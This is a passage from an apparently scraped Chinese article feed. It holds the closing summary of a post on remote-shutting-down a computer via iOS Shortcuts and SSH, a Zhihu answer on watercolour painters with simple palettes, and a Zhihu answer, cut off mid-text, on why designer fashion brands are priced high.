</p>\n<h3>文章总结</h3>\n<p>本文以远程关机为例，教学如何使用捷径通过 SSH 对电脑电源进行操作。在作者的日常生活中，其实更多的是配合其他模块共同使用，作者的捷径里有一个名为「离开模式」的捷径，它的功能是关闭屏幕挂灯和电脑休眠。在作者需要出门的时候，手上在整理出门要带的东西，嘴上就可以直接喊：「heySiri，离开模式」。东西收拾好之后，也就可以直接离开了，免去了手动休眠和关闭挂灯的步骤。当然这还是比较简化的描述，以后可能会专门在写一篇文章，来介绍这个捷径的制作过程。</p>\n<p>另外，SSH 能够做到的绝不止本文所提的电源控制，还可以是音量的加减，打开网页，打开软件等。本文以电源控制为例，只是举了一个常用的场景。本文抛砖引玉，希望读者能够结合自己的生活场景举一反三，做出一些更适合自己的捷径。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/08/04/article/6ccc688d9f83d5a93d05eccae4415c41\"></figure><h3>关联阅读</h3>\n<p><a href=\"https://sspai.com/post/61379\" target=\"_blank\">通过 pmset 工具管理 masOS 睡眠，让你的 Mac 睡得更好</a></p>\n<p><a href=\"https://sspai.com/post/43546\" target=\"_blank\">Mac 上隐藏了许多实用的功能，只有这样才能打开</a></p>\n<p><a href=\"https://sspai.com/post/39524\" target=\"_blank\">歪用 HomeKit 让 Siri 更「听话」</a></p>\n<p>&gt; 下载少数派 <a href=\"https://sspai.com/page/client\">客户端 </a>、关注 <a href=\"https://sspai.com/s/J71e\">少数派公众号 </a>，了解更妙的数字生活 🍃</p>\n<p>&gt; 想申请成为少数派作者？<a href=\"https://sspai.com/apply/writing\" target=\"_blank\">冲！</a></p>\n<p>© 本文著作权归作者所有，并授权少数派独家使用，未经少数派许可，不得转载使用。</p>\n","link":"https://sspai.com/post/68101"},{"title":"有哪些色彩简单却又令人惊艳的画师？","date":"2021-08-08 23:06:51","description":"<div>\n<div>\n<div>\n<img src=\"https://pic3.zhimg.com/v2-dad61e25d1df1ff887178b98f766504b_l.jpg?source=8673f162\"><span>Scotty，</span><span>我总能找到些被忽视的珍珠</span>\n<a href=\"https://www.zhihu.com/question/355628920/answer/2026979390\" hidden>阅读原文</a>\n</div>\n<div>\n<p><strong>0.写在最前</strong></p>\n<p>其实在我看来，色彩从来就没有简单和复杂之分，当你站在一个创作者的角度去欣赏时，你会发现其实每一笔的用色都经过了考量，而这种介于色彩之间的考量是平等的，没有说什么颜色用起来很简单，什么颜色用起来很复杂，所以说当我站在一个以“简单”为标准去衡量的选择后，我有点不适应，我不太明白简单具体指什么?</p>\n<p>调色简单？不要使用太多高级灰和饱和度低的颜色？</p>\n<p>配色简单？不要使用过多的颜色显得花里胡哨？</p>\n<p>用色简单？以黑白作品为主体，用一点点颜色去点缀一下就行了？</p>\n<p>简单这个词，在我看来不在色彩的领域中，</p>\n<p>所以这篇文章，我的选择是以上述这三种“简单”作为一个相对参考的复合标准所选取的作品，更多的倾向还是选择让人“令人惊艳”的作品；</p>\n<p><strong>1.Mark Adams 的水彩静物和风景画</strong></p>\n<p>Mark Adams（1925 - 2006），美国艺术家、设计师，以其简约克制的水彩作品闻名于世；</p>\n<p>Mark Adams 绝对是最切题的画家之一了，简约的造型，干净的颜色，可每一幅都能让你流连忘返，这里面的内容可一点都不简单，每一幅画在提升画面效果的地方都细节拉满；</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-e57954c568ca1dd6b937036b5302e400_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-e5bf61c0205cf95e08f571d329c07ad9_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-4186cf6bb1f8bf1a8b715bc447ab28c5_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-9f3c347f5a0f450ebcbd7ec9e8fb61b1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-1cde2d1cb736e63d95d313daea595cae_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-962d510b55b1d0d18ba9c70eacfecedd_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-931017c63d5248ab788893b3ada618e4_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-17ce21dd6db0ad1f09c0ad1fff2960ba_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-788453c1d7d5f48e598877ca8c240eac_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-a1c363056933d17ae8fc5592bb8c215a_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-73f291c2fd1c29281c76cc995389b346_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-3acc17cb0f30def3f4979b71e1ad856f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-53c5142f97139d684c99fc49c796cf5e_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-9a29dfbfa4c7d4d7444db2913b96e958_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-a28cdd7bb1de2740945d414addc2e10f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-ce8f5b38c0c97520d0121b711c36878f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-d543793a43d81ea8c10baada16e2ac33_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>2.英国画家 Charles Villeneuve 的建筑水彩画</strong></p>\n<p>Charles Villeneuve，出生于 1971 年，法国水彩画家、建筑设计师，他的水彩画多以欧洲的城市风光为主，</p>\n<p>Charles Villeneuve 刻意去用水彩营造出一股清冷雾朦的氛围，这种用色反而接近了我们印象中的真实，建筑绘画中对于细节的取舍其实是成败的关键，Charles Villeneuve 这一块的节奏处理感比较好，用色调去做整体的大的光影区分，再用独到的笔触去丰富里面的细节，既完整又不失细节，简单的用色，但画面的确让人眼前一亮；</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-fbe65fdc5ad7be6865a35d8caad3d396_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-15f5cb5e7cada5e590084f94d225df0d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-690b16d45188fa5563d5a014099a99c0_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-ad7e340500f834c57afe7d8fbb7ef22f_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-86703dba47de7a595e06e0a61e5c9fef_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-34a3fcd804a98e0ccbe109d1a2f2c5d2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-d2cee5484642980328c58a7ceb98021b_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-28d373ab919720f21b69dc0dddea40bc_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>3.Dansleciel Toutvabien 的风景绘画</strong></p>\n<p>绚烂抽象的艺术自然风光，非常简单又奇妙的色彩搭配，Dansleciel Toutvabien 非常喜欢用圆形的居中构图，也有在画面局部使用边缘线的习惯，在颜色的使用上处理出了一种滤镜般的质感；</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9b380a829aa12b647dc9d8cbcc6e6b2d_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-0cbd0d4e6c3a5d16ad06db04a923bd91_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-6c36dee0c9c29a30f5c4bc1dfa10e6f8_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-e51d18a47a6fefebd0a9d5303fc63fbc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-3e4bcacfb0aa90d29506f02458d70921_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-c51923cec287f8d5335e0177150e31c2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-68be99cd5bb609758c463e036e3fdde4_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>4.塞尔维亚画家 Endre Penovác 的迷幻森林</strong></p>\n<p>Endre Penovác，出生于 1956 年，塞尔维亚水彩画家，这位画家的很多作品都是受到中国的水墨画影响而创作，最著名的是黑猫系列，最后放上一张黑猫给各位看看</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-aa1669dc8a5e5931f3f3eac3f27da3d2_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-023fd309183cf777a8cd45e17d8806bc_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-8413d551c8143c440683fb4492e82737_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-b01c72d00cff709079cdeaed9caf51c1_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic3.zhimg.com/v2-0156f76de02cdb7be737b8f772333642_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic1.zhimg.com/v2-e623944ca68501bae1b40ada31c4cb12_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-c23e707507d9ff95a677dda1d3b9ae78_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic4.zhimg.com/v2-62eedeace5b54c80109282d9b2ab2326_720w.jpg?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pica.zhimg.com/v2-e5b4daae3e69cea994c6ba602714d211_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Endre Penovác 的这组猫咪相信很多人都看过了，利用水彩的特征去表现猫咪毛发的质感，在造型上也非常生动，收到很多人的喜爱；</p>\n<hr>\n<p>最近我把我这几年在知乎写的一点关于绘画、艺术的干货做了个汇总，大家有需求的欢迎去看看。</p>\n<p><a href=\"https://zhuanlan.zhihu.com/p/98208948\">Scotty：连点绘面：近年来写的绘画、艺术干货汇总 持续更新</a></p>\n<p><strong>以上</strong></p>\n</div>\n</div>\n<div><a href=\"https://www.zhihu.com/question/355628920\">阅读原文<span></span></a></div>\n</div>","link":"https://daily.zhihu.com/story/9739021"},{"title":"为什么服装设计师品牌的价格普遍偏高？","date":"2021-08-08 23:06:45","description":"<div>\n<div>\n<div>\n<img src=\"https://pica.zhimg.com/v2-7bba358ba9cb3fdddc02d3853a68d6be_l.jpg?source=8673f162\"><span>陈一丁Dingslook，</span><span>公众号叫「一只马丁靴」，其他平台@陈一丁Dingslook</span>\n<a href=\"https://www.zhihu.com/question/23052376/answer/2041071772\" hidden>阅读原文</a>\n</div>\n<div>\n<p>之前有读者问到：</p>\n<blockquote>“感觉很多设计师品牌原创性并不高，单品也没有非常惊艳，<strong>凭什么卖那么贵？</strong>”</blockquote>\n<p>这种想法也可以理解，引领时尚的设计师品牌，确实有很大一部分营销成本。</p>\n<p>著名时尚作家 Mark Tungate 就一针见血地说：“当衣服完成制作出厂时，它们还仅是衣服或服装。只有到了营销人员的手中，它们才神奇地变成了时尚。”</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0c647def04c1bfa767ea4f7aa7a28592_720w.jpg?source=8673f162\" alt=\"\"></figure><p>那对我们这些普通消费者来说，<strong>贵价设计师品牌到底值不值得买？</strong>该用怎样的态度对待这些品牌？今天就来聊聊这个有趣的话题吧~</p>\n<p><strong>====</strong><strong><strong>一、什么是设计师款？</strong></strong></p>\n<p>之前用来举例的图片里，出现过这种分趾鞋（Tabi Shoe），大家可能也注意到了：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-081b3a6b23a06b0c8d062a5c5a211695_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲其实这是 Maison Margiela 品牌的标志性设计 ，早在 1988 年就进入时装界了。</strong></p>\n<p>这种鞋子大部分人可能觉得<strong>有点古怪，</strong>但即便价格在 6k 人民币以上，还是有好多人买。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-35348109f61157181c09afeaa857c2ca_720w.jpg?source=8673f162\" alt=\"\"></figure><p>一面是很多人觉得又贵又丑，一面是少数人觉得个性特别。</p>\n<p>这种差异也体现了设计师款的一个特点：它<strong>不是面向广泛大众的，</strong>而是<strong>更在乎品牌特点和风格，</strong>为风格契合的人群服务。</p>\n<p>现在大家是不是对设计师款多了一点理解呢？</p>\n<p>那下面我们就来更具体地聊一聊，<strong>什么是设计师款，</strong>以及它们<strong>凭什么卖得这么贵。</strong></p>\n<p><strong><strong>▍ 设计师款的定位</strong></strong></p>\n<p>看这张图就一目了然了：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-ec033798ed4301eeb364df95d9757c87_720w.jpg?source=8673f162\" alt=\"\"></figure><p>大家对奢侈品和大众品牌可能更熟悉：</p>\n<ul>\n<li>\n<strong>奢侈品</strong>主张稀缺珍奇，附加值非常高，价格非常昂贵；</li>\n<li>\n<strong>大众品牌</strong>提倡紧跟潮流，更新换代很快，价格更亲民。</li>\n</ul>\n<p>而设计师品牌的定位，就<strong>介于奢侈品和大众品牌之间，</strong>不像奢侈品牌那么高高在上，又比大众品牌有更多设计心思。</p>\n<p>一些奢侈品的设计师会成立个人品牌，这也<strong>抬高了设计师品牌的档次和价格。</strong></p>\n<p>Céline 前任设计师 Phoebe Philo ，前阵子刚宣布要推出个人同名品牌，在时尚圈里也是个大消息了。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4aae3edb2225485fcc521a72df8c8b17_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong><strong>▍ 设计师品牌的风格，与本人强烈挂钩</strong></strong></p>\n<p>很多设计师品牌是以<strong>设计师本人的名字</strong>命名的，从这点就可以看出，主理人对品牌的风格和定位<strong>有较大的话语权。</strong></p>\n<p>这样<strong>设计师受到的限制更小，</strong>可以更大胆地发挥创意，表达出自己想要的风格个性。</p>\n<p>我们来看<strong>两个风格完全不一样</strong>的设计师，马上就能 get 到了。</p>\n<p>Jil Sander 说自己是一个纯粹主义的人，她的同名品牌就贯彻了这份纯粹。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-8baac6f792115059efb82ea420297fb2_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这个品牌的衣服通常只用中性的颜色，剪裁精简清晰，着力突出结构和材质本身的美感，<strong>纯粹到只看得见纺织布料&amp;剪裁设计。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-9a459e86a3522d4fdf59593d10555089_720w.jpg?source=8673f162\" alt=\"\"></figure><p>Simone Rocha 则非常迷恋冲突，她认为所有事物都有一体两面的双重性，很喜欢女性艺术家路易丝·布儒瓦的作品：</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-813e04639a8ec0e01d8199aed0445943_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲Rocha 和布儒瓦的织物雕塑。</strong></p>\n<p>她的同名品牌就代表了<strong>暗黑美学的极繁主义，</strong>层次很丰富，经常用薄纱、粗花呢、缎布等材质的碰撞，来表现死亡 - 烂漫这种极端的冲突。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-70096b0e0108a70c518af6e5d3475247_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲还会用华丽的刺绣、立体的编织，来表现传统精致的爱尔兰风情。</strong></p>\n<p>是不是感觉她们的个人和作品都好有个性？</p>\n<p>因为风格特别强烈，这时候消费者跟设计师之间，往往就<strong>不只是买卖关系</strong>了，而像是俱乐部关系，<strong>审美相同的人因为爱好聚在一起。</strong></p>\n<p>也就是说，不止认可这个产品，更多是认可这种鲜明的审美。</p>\n<p><strong><strong>▍ 设计师款凭什么这么贵？</strong></strong></p>\n<p>很多人在纳闷，设计师款为什么卖得这么贵啊！</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-4c0c70abc8de15bffe48f86187b8192c_720w.gif?source=8673f162\" alt=\"\"></figure><p>我们先说说<strong>贵的一些合理因素</strong>吧，这个定价也不全是割韭菜，设计师款往往要负担高额的设计成本，对细节也更考究，<strong>本身的制作成本就比一般工厂高很多。</strong></p>\n<p>单从最基本的面料，就可以看出差别了。很多工厂的面料是流水线大批量生产的，而好的<strong>设计师品牌很愿意在面料上耗费心血。</strong></p>\n<p>熟悉 Dries Van Noten 的读者知道，他家的特色是活力满满的色彩、印花和刺绣，这样就<strong>得专门去定制面料。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-c4cb9437f307177404158e87461c21e4_720w.gif?source=8673f162\" alt=\"\"></figure><figure><img src=\"https://pic2.zhimg.com/v2-2b1e1cc74e802276003f3af94b7ab8b6_720w.gif?source=8673f162\" alt=\"\"></figure><p><strong>▲ 设计师认为人工比机器更加灵活，可以更细致地表现出想要的细节。</strong></p>\n<p>但在如今商业化的大背景下，大集团出手收购上游供应商，很多<strong>传统的面料厂就不再对外供应了。</strong></p>\n<p>像 CHANEL 就在 2016 年收购了顶级提花面料工厂 Tissages Denis &amp; Fils：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-931d143b47486c31c6ed152642dc4b11_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲这是这家工厂制作的一种提花面料 Jacquard lamé，是不是超精致？</strong></p>\n<p>在这种环境下，<strong>想挑到合适的面料变得越来越难，面料的成本也变得更高。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-250bdb52ba3b58ea7b05266d4cc191bf_720w.gif?source=8673f162\" alt=\"\"></figure><p><strong>▲DVN 的设计师在采访里提到了这点。</strong></p>\n<p>普通工厂款就没法注入这么多心血和成本了，往往是看到一个面料流行起来，就立刻让版师打版出类似的款式，尽快开始售卖，<strong>不可能为了设计本身去定制面料。</strong></p>\n<p>所以经常会出现“撞花色”的情况，今年买的连衣裙，过几年后还会在大街上看到同样的布料，只不过做成了其他样式。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-3605a39b853adf2479b5ed8479fd1db6_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲同一个布料花色，很多店铺都在用。</strong></p>\n<p>除了面料，优秀设计师品牌在<strong>版型和剪裁工艺上把控</strong>也很费心。</p>\n<p>就说最基础的西装，Lemaire 会细致地调整前襟和肩部的比例，让西装的版型更柔和含蓄，同时剪裁干净利落，轮廓鲜明，整件西装看上去<strong>简约又儒雅。</strong></p>\n<figure><img src=\"https://pica.zhimg.com/v2-90de9dcdfc70dfe858d95f6ac5fc8ff6_720w.jpg?source=8673f162\" alt=\"\"></figure><p>而普通的工厂流水线，更关心<strong>控制成本、批量生产，</strong>不会这么耗费心力，有的衣服穿上身会<strong>缺少一种“平衡感”</strong>，比如领口不对称、袖笼扭曲、前后片不对称等等。</p>\n<p>为了帮助大家理解，这里找了个比较典型的例子，整件衣服扭曲感很重，上身也非常不平顺：</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9b0f7a03f183e54e38d353ddc74894da_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲ 这种剪裁就非常差，显得整件外套都极其廉价。</strong></p>\n<p>这样看来，设计师品牌的特点是精益求精，那按这个价格买就一定很值吗？</p>\n<p><strong>====</strong><strong><strong>二、压根不值 or 买到赚到，不妨参考这 3 点</strong></strong></p>\n<p>客观来说，<strong>设计师品牌也存在较高的溢价，</strong>主要来自这 3 个方面。</p>\n<p><strong><strong>▍ 产品本身就不值，标价虚高</strong></strong></p>\n<p>抛开品牌理念，单看衣服质量的话，一些设计师品牌是不值得这个标价的。</p>\n<p>之前我入手了一件 LOW CLASSIC 的风衣，面料符合衣服的风格，版型也很利落显精神，还是蛮有中高端品牌该有的质感。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-0fd4dcd7a4d890676eb5eaf8f5fc6515_720w.jpg?source=8673f162\" alt=\"\"></figure><p>但这件 3800 元的风衣<strong>配了很廉价的塑料扣，</strong>近看直接把整体质感都拉低了。按品质来看，这样的塑料扣不该出现在这种定价的衣服上：</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-b2b8ad8f0b923890a717d3ef3e5b83f0_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲ 面料也是普通的棉 + 尼龙混纺，这个价格也并不是在为品质买单。</strong></p>\n<p>另外，还有一些品牌<strong>设计缺少美感，</strong>更多是在卖“设计款”这个标签。</p>\n<p>这些单品动辄 2k+ 起步，但<strong>设计只是一股脑儿堆砌，</strong>足够浮夸张扬却很难称得上好看，除了秀场想不到其他场景能穿。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-e466874ad3db5626e14382244ca0a880_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲</strong><strong>有读者就说不是不想支持国货，而是这样浮夸的设计实在下不去手。</strong></p>\n<p>更恶劣的是<strong>抄袭照搬</strong>的，很容易让消费者失去信任。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-874e7494b56aef85a64b8bc2f677c6b8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲</strong><strong>Aone By Wong 2021 春款，就被发现和越南设计师品牌 Lobbster 2020 春夏系列高度雷同。</strong></p>\n<p><strong><br><strong>▍ 擅于营销，抬高身价</strong></strong></p>\n<p>营销应该是大家心知肚明的一点了。时尚品牌不只出售产品本身，也会包装品牌理念等附加值抬高身价。</p>\n<p>很火的 Acne Studios 就是个典型例子，它家大多是质感比较好的基础款，但因为一部分营销的因素，<strong>基础款也卖出了很高的价格。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-0f928371375431c25a14aa4888a62fb1_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲这两件折合成人民币差不多要 5k+/3k+，单论产品本身，确实不值标价。</strong></p>\n<p>创始人 Jonny Johansson 在 1996 年品牌创始初期，就用了非常独特的传播策略。</p>\n<p>他没有像其他品牌一样进行商业推广，而是寄出 100 条牛仔裤，送给斯德哥尔摩的“有创造力的孩子”。这样有爱的宣传方式，就<strong>树立了很正面的形象。</strong></p>\n<p>还自创刊物 Acne Paper，输出自己的设计理念，并且<strong>和不同的领域跨界合作，扩大品牌的影响力。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-1de30b246d493ef387ed2e72ac65b733_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲摄影作家 Robin Muir 刊登在 Acne Paper 上的文章。</strong></p>\n<p>这样新奇的营销策略引起了 Wallpaper 和 French Vogue 的注意，后来越来越多的名人和博主穿起了 Acne，也<strong>吸引了更多的粉丝和消费者。</strong></p>\n<p>除此之外，Acne Studios 的<strong>品牌理念</strong>也打造得很成功。</p>\n<p>他们把基础款打造得比较有质感，同时给了很高的定价，强调瑞典出身的北欧极简清冷气质，给人的印象是<strong>非常讲究品质的小众基础款。</strong></p>\n<figure><img src=\"https://pic1.zhimg.com/v2-9a63dca8505e0fbff38261f337bf5645_720w.jpg?source=8673f162\" alt=\"\"></figure><p>这样的品牌形象和定位，就很能获得中高端收入群体的青睐。他们大多经济能力比较好，又不屑于穿奢侈品，<strong>想要云淡风轻穿出档次。</strong>这样的顾客群体反过来也抬高了品牌的调性。</p>\n<p><strong><strong>▍ 其他成本，要素过多</strong></strong></p>\n<p>除了产品本身的附加值，还有些<strong>无法避免的客观因素，</strong>也增加了国外设计师款的成本。</p>\n<p><strong>① 各种税费</strong></p>\n<p>现在很流行各种跨界联名，但其实这种合作的背后，也是需要缴纳<strong>高额的设计费</strong>和<strong>版权费</strong>的。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-fa7bcbc0b5ab2554ac2a823efba1a0a8_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲ Disney X Jimmy Choo / 奈良美智 Doggy Radio x Rimowa。</strong></p>\n<p>另外<strong>进口物品都需要缴纳关税，</strong>海关对物品的分类做得非常细致。而且设计师品牌的实际进口价格也远超完税价格 2 倍，所以实际的税额就会很高：</p>\n<figure><img src=\"https://pica.zhimg.com/v2-5d853065e005b582f932e03d170999c9_720w.jpg?source=8673f162\" alt=\"\"></figure><p>-2019 年第 63 号《中华人民共和国进境物品完税价格表》-</p>\n<p><strong>② 运输物流成本</strong></p>\n<p>除了各个航线的<strong>运输报价在不断上涨，集装箱的成本也在变高，</strong>各种装载费、倒箱费、滞留费、空箱费等等加起来，也是一笔不小的数目。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-8843baa43c0b7f7f9bdac95f0a2c7496_720w.jpg?source=8673f162\" alt=\"\"></figure><p>尤其是家居类，产品体积大，加上运费售价几乎翻倍！</p>\n<p>最近我在看家具，很喜欢一个躺椅，咨询了一下航运公司，按体积算运输费用真的很贵，都快赶上躺椅本身的价格了。</p>\n<p><strong>③ 仓储场地费</strong></p>\n<p>最后就是<strong>仓储和门面</strong>的费用了。</p>\n<p>像家居这类大型产品，很多都是在线下<strong>一边展览一边售卖</strong>的，环境好一点的展厅租金就非常昂贵，而且还要担负仓储、搬运的费用。</p>\n<figure><img src=\"https://pic3.zhimg.com/v2-06638f91edad2579327bf9a96ebf1e7d_720w.jpg?source=8673f162\" alt=\"\"></figure><p>前面刚提过的躺椅，也是海外家居设计师品牌，尽管自己海淘费用昂贵，但线下店的价格比这还要高很多，因为他们得保住绝对的利润空间。</p>\n<p>服装类的设计师品牌也是同样的道理，<strong>门店的成本</strong>也会被计入到品牌的运营成本，而且很多设计师品牌为了<strong>保持高端形象，</strong>都会把店开在一线城市的黄金区域。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-b1b5fdb52820aa6dd6a349debd34e325_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲前面提到过的 DVN 和 Acne studios，在上海的门店就都在静安区芮欧百货。</strong></p>\n<p>这一连串成本最后还是要消费者来承担，无形中就增加了商品的价格。</p>\n<p>好，那大家对设计师品牌的价格值不值，<strong>可能也有自己的看法了。</strong>最后我们就一起来聊聊，日常里该怎样安排自己的消费吧！</p>\n<p><strong>====</strong><strong><strong>三、建立怎样的消费观，能更好地享受设计师品牌？</strong></strong><strong><strong>▍ 聪明的消费者，会这样去买</strong></strong></p>\n<p>虽然设计师品牌有比较高的溢价，但稍微筛选下，也能找到一些款式品质都很优秀的单品。</p>\n<p>就像每家饭馆都有拿手菜一样，每个品牌也有自己擅长的领域和代表性单品，他们会<strong>不吝啬成本和精力，</strong>维护好自己的这个门面。</p>\n<p>聪明会买的消费者就知道，<strong>这类“门面”其实是最值得下手投资的。</strong></p>\n<figure><img src=\"https://pic3.zhimg.com/v2-fb3f3c82f883dcbea1cab86e117f3373_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲像 Diane Von Furstenberg 的裹身裙、 Selkie 的泡泡裙，都是各自最具代表性的单品。</strong></p>\n<p>如果你的预算有限，就没必要入手他们不太擅长的品类了。</p>\n<p>比如去 Jacquemus 买针织衫就不太值得，衣服非常薄透，没洗两次就会变形很严重，<strong>和快消品牌相比优势并不大。</strong></p>\n<figure><img src=\"https://pic2.zhimg.com/v2-7091832bcb18095511cc6d88fbfd96e5_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲</strong><strong>想买高品质针织，还不如去买鄂尔多斯的羊毛衫。</strong></p>\n<p><strong><strong>▍</strong><strong>消费都是和预算挂钩的</strong></strong></p>\n<p>经济条件不一样，<strong>对待贵价商品的心态肯定差别很大。</strong></p>\n<p>香奈儿这几年频繁涨价，中号的 CF 手袋已经突破 5W 块；还有爱马仕的配货方式，真是拿着钱都买不到。常人可能难以理解，但贵妇们仍然一包难求。</p>\n<figure><img src=\"https://pic1.zhimg.com/v2-d70c3c2ca222d7c4345449dad11982b9_720w.gif?source=8673f162\" alt=\"\"></figure><p>其实就是因为<strong>经济能力和预算不同，</strong>贵妇眼里的一万块和我们的一百块差不多，在我们看来是奢侈品，在她们眼中可能只是生活需求（贫穷真的会限制想象力）。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-d3c19ba9678b54829a6d823dc04980c7_720w.jpg?source=8673f162\" alt=\"\"></figure><p>所以不管是大众品牌还是设计师品牌，大家都是<strong>各取所需，</strong>来满足自己的日常需求罢了。对这种贵价商品，根据预算量力而行就好了。</p>\n<figure><img src=\"https://pic2.zhimg.com/v2-c311c0307eac9156ebe845cdccc67bb1_720w.gif?source=8673f162\" alt=\"\"></figure><p><strong><strong>▍ 多方面考虑清楚需求</strong></strong></p>\n<p>决定买不买，最终也是要考虑我们自己的<strong>消费需求，</strong>包括了心理需求和实际需求。</p>\n<ul><li><strong>心理需求</strong></li></ul>\n<p>心理需求就是我们之前提到的，看你对这个品牌的<strong>文化、理念是不是有共鸣。</strong>能找到和自己气质契合的品牌，是件很幸福的事。</p>\n<figure><img src=\"https://pica.zhimg.com/v2-e3fb81485148ea36386509896cd63d81_720w.jpg?source=8673f162\" alt=\"\"></figure><p><strong>▲Ann Demeulemeester 